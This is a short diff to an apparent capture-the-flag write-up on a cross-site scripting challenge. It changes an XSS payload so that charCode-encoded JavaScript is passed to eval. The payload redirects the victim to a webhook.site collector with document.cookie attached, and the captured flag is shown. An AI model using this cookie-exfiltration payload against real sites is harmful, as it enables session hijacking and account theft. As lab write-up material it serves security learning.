@@ -10,6 +10,6 @@ Charcode encoder: https://codepen.io/HerbertAnchovy/pen/XLzdYr
 I used https://webhook.site/ to receive the cookies.
 Encode to charCode: window.location="<Your_Webhook_Link>/?Cookie="+document.cookie
 
-Payload: http://159.65.249.122:3000/#|javascript:String.fromCharcode(<Charcode_Encoded>)|http://159.65.249.122:3000/|\||\\
+Payload: http://159.65.249.122:3000/#|javascript:eval(String.fromCharcode(<Charcode_Encoded>))|http://159.65.249.122:3000/|\||\\
 
 Flag: https://webhook.site/<...>/?Cookie=token=HACKAFLAG{T1m3_t0_r3st4rt}
